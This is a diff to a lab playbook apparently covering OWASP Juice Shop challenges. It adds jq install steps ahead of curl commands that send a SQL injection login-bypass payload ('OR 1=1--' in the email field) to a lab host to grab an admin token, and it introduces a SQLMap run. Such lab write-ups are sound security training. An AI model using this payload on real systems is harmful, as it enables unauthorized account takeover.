@@ -21,6 +21,11 @@ This playbook summarizes the main challenge categories and solutions for OWASP J
 **Manual Command:**
 
 ```zsh
+# Install jq if not already installed
+wget -O jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
+sudo chmod +x ./jq
+sudo cp jq /usr/bin
+
 # Get JWT token
 TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
@@ -34,6 +39,11 @@ curl -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
 **SQLMap Command (Automated with Bearer Token):**
 
 ```zsh
+# Install jq if not already installed
+wget -O jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
+sudo chmod +x ./jq
+sudo cp jq /usr/bin
+
 TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')
